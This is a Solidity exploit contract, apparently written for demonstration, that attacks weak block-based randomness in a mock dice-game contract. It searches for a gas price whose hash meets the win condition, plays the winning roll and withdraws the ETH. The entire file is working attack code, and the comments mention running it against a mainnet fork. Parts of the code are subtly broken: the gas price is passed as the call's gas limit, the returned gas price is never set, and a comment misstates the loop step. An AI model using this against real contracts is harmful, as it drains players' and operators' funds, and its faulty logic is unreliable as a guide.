// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "./IMockRiskyDiceGame.sol";
import "./MockRiskyDiceGame.sol";
import "./Ownable.sol";

struct HashInputs {
    address msgSender;
    address txOrigin;
    uint256 blockTimestamp;
    uint256 txGasPrice;
    bytes32 blockHash;
}

// This contract is used to exploit the "rollDice()" function in the MockRiskyDiceGame contract by finding the lowest viable gasPrice
// satisfying the win condition (above the block baseFee) using a VM fork of the Ethereum mainnet and then executing the winning dice roll 
// via a backend Hardhat/ethers.js script by calling the "rollDice()" function in the MockRiskyDiceGame contract with the winning inputs.
contract MockRiskyDiceGameExploit is Ownable {
    event DiceRollEvent(bool, uint256, HashInputs);
    event GasPriceRange(uint256 minGasPrice, uint256 maxGasPrice);

    constructor() payable {
        // Created a mock RiskyDiceGame contract here for demonstration in local VM simulation, giving it a 10 ETH balance.
        MockRiskyDiceGameAddress = address(
            new MockRiskyDiceGame{value: 10 ether}()
        );
        RDG = IMockRiskyDiceGame(MockRiskyDiceGameAddress);
    }

    address public immutable MockRiskyDiceGameAddress;
    IMockRiskyDiceGame private immutable RDG;
    HashInputs private storedHashInputs;

    function retrieveStoredHashInputs() external onlyOwner view returns (HashInputs memory) {
        return storedHashInputs;
    }

    // This function is used to test the deterministic hash result of the "rollDice()" function in the MockRiskyDiceGame contract
    // whilst searching for the lowest gasPrice (above the current network gas price) satisfying the win condition and assigns the
    // storedHashInputs variable with the winning inputs.
    function testDeterministicHashResult()
        external
        onlyOwner
        returns (HashInputs memory winningInputs)
    {
        // Get current network gas price and add buffer
        uint256 currentGasPrice = block.basefee; // available since EIP-1559
        uint256 minGasPriceWei = currentGasPrice >= 2e9 ? currentGasPrice * 12 / 10 : 2e9; // Add 20% buffer or 2 Gwei minimum
        uint256 maxGasPriceWei = 100e9; // Cap at 100 Gwei

        // Log the gas price range we're searching
        emit GasPriceRange(minGasPriceWei, maxGasPriceWei);

        // Increment the gas price as "i" by 0.1 Gwei (1e8) per iteration in a for loop
        for (uint256 i = minGasPriceWei; i < maxGasPriceWei; i += 1e8) {
            address msgSender = address(this); // Use address of this contract because it will become msg.sender when calling RDG.rollDice()
            address txOrigin = tx.origin; // tx.origin could also be manipulated by the caller by using different EOA.
            uint256 blockTimestamp = block.timestamp + 12; // Add 12 seconds to the block timestamp anticipating the block being finalized
            bytes32 previousBlockHash = blockhash(block.number - 1); // Use the previous block hash (current block hash unavailable)

            // Calculate the keccak256 hash result (as a uint256) for the current iteration
            uint256 hashUint = uint256(
                keccak256(
                    abi.encode(
                        msgSender,
                        txOrigin,
                        blockTimestamp,
                        i, // iterate "i" representing gasPrice by 1 Gwei (1e8)
                        previousBlockHash
                    )
                )
            );

            // Check if the hash result satisfies the win condition of the "rollDice()" function
            // There are actually many winning hashes for this condition (i.e. when "hashUint / 6" has a remainder of "5")
            // but here we calculate the lowest gasPrice >= currentGasPrice satisfying the condition
            if (hashUint % 6 == 5) {
                HashInputs memory winningInputsMemory = HashInputs({
                    msgSender: msgSender,
                    txOrigin: txOrigin,
                    blockTimestamp: blockTimestamp,
                    txGasPrice: i,
                    blockHash: previousBlockHash
                });
                storedHashInputs = winningInputsMemory;
                return winningInputsMemory;
            }
            // Returns the struct with uninitialized values if no winning combination is found.
        }
    }

    // This function is used to execute the winning dice roll by calling the "rollDice()" function in the MockRiskyDiceGame contract
    // with the winning inputs stored in the storedHashInputs variable whilst sending the required 1 ETH to the contract. This contract 
    // will become the msg.sender when calling RDG.rollDice() function.
    function executeWinningDiceRoll(HashInputs calldata hashInputs)
        external
        payable
        onlyOwner
        returns (
            bool success,
            uint256 txGasPrice
        )
    {
        uint256 balanceBefore = address(this).balance;
        // This contract will become the msg.sender when calling RDG.rollDice() function.
        try RDG.rollDice{gas: hashInputs.txGasPrice, value: 1 ether}() {
            // Confirm the balance change (increase) in this contract
            if (address(this).balance > balanceBefore) {
                emit DiceRollEvent(true, txGasPrice, hashInputs);
                return (true, txGasPrice);
            }
        } catch {
            emit DiceRollEvent(false, txGasPrice, hashInputs);
        }
        return (false, txGasPrice);
    }

    function getEthBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdrawEth(address payable to)
        external
        onlyOwner
        returns (bool success)
    {
        (success, ) = to.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    receive() external payable {}
}
